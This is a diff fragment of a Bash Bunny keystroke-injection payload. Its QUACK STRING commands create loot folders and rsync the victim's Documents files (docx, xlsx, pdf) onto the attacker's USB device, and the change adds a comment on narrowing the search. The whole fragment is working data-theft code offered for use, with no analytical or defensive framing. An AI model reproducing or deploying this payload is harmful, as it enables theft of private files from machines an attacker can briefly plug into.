@@ -35,6 +35,7 @@ QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Desktop;
 QUACK ENTER
 QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Downloads;
 QUACK ENTER
+# For search only in the directory and not in the subfolders remove '/**'
 QUACK STRING rsync -av Documents/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Documents ;
 QUACK ENTER
 QUACK STRING echo "Please wait while the files are copied...";
